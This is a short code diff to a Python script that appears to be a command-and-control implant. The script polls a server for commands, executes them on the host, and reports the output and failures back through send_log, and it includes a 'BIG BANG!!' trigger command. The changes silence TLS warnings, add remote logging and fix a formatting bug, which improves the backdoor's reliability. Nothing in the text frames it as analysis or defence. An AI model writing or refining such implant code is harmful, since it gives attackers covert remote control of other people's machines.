@@ -15,7 +15,8 @@ from cryptography.hazmat.primitives import padding
 import os
 import base64
 import hashlib
-
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BLOCK_SIZE = 16
 KEY = "your_secret_key_here"  # Replace with your actual key
 
@@ -217,6 +218,7 @@ def main():
         if cmd is None:
             fail_count += 1
             print(f"Failed to poll command. Fail count:{fail_count}")
+            send_log(f"Failed to poll command. Fail count:{fail_count}")
         else:
             fail_count = 0
             if cmd.strip() == "BIG BANG!!":
@@ -230,7 +232,7 @@ def main():
                     send_log(f"File {file_path} does not exist.")
             else:
                 result = execute_command(cmd)
-                result = f"Executed Command: {cmd}\Output:\n{result}"
+                result = f"Executed Command: {cmd}\nOutput:\n{result}"
                 send_log(result)
         time.sleep(15)
 
